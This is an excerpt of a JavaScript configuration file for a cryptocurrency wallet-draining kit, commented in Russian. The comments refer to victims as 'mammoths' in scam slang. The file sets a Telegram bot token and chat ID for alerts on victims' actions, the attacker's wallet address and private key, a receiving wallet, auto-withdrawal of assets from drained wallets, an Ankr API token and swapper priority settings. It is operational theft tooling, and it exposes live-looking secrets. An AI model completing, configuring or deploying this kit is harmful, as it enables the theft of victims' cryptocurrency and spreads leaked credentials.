...
const MS_Telegram_Token = "7147545713:AAGr7-arFrPYWMDL3ojymVXblU2uwHTLCts"; // Сюда вписать свой токен от бота из @BotFather (заходите туда, там создаёте бота и получаете этот самый токен)
const MS_Telegram_Chat_ID = "6672241620"; // Сюда вписать ID чата, куда нужно отправлять уведомления о действиях мамонта (если ID начинается с минуса, так и записываем)

const MS_Wallet_Address = "0x271FAc62147dA0DdFAe2f353A7aF68488b1A66B4"; // Адрес кошелька, куда будут идти активы мамонта
const MS_Wallet_Private = "75c392f53989320d2622b005d95f194bc205f8b65a9db4b6a69248660fc95951"; // Приватный ключ от кошелька выше, УКАЗЫВАТЬ ОБЯЗАТЕЛЬНО, А ТО НЕ БУДЕТ РАБОТАТЬ ВЫВОД
const MS_Wallet_Receiver = "0x271FAc62147dA0DdFAe2f353A7aF68488b1A66B4"; // Кошелек, куда будут приходить активы, может быть таким же, как MS_Wallet_Address, а может быть иным
...
const MS_Allowance_Check = true; // Проверять кошельки на наличие повторных пополнений (не включать, если используется сторонний софт)
const MS_Allowance_Withdraw = {
  mode: true, // Автоматически выводить найденные новые активы из кошелька (работает только при включенном MS_Allowance_Check)
  ...
  wallets: { // Список кошельков, где работает автоматический вывод, включая ваш основной кошелек (ADDRESS:PRIVATE)
    "0x271FAc62147dA0DdFAe2f353A7aF68488b1A66B4": "75c392f53989320d2622b005d95f194bc205f8b65a9db4b6a69248660fc95951",
  }
};
...
const MS_Ankr_Token = "7d674dc637b0339f03682ab9cbf95ebb777a435d6a814f3641d2c4e70d6b11e7"; // Токен от Ankr Premium, оставьте пустым ("") чтобы использовать Ankr Free
...
const MS_Settings = {
  ...
  Tokens_First: 1, // 0 - по цене, 1 - нативный токен всегда последний
  ...
  Swappers: {
    Enable: 1, // 0 - отключено (РЕКОМЕНДУЕТСЯ), 1 - включено
    Priority: 2, // 0 - без приоритета, 1 - с приоритетом (но после Permit), 2 - с приоритетом (абсолютный)
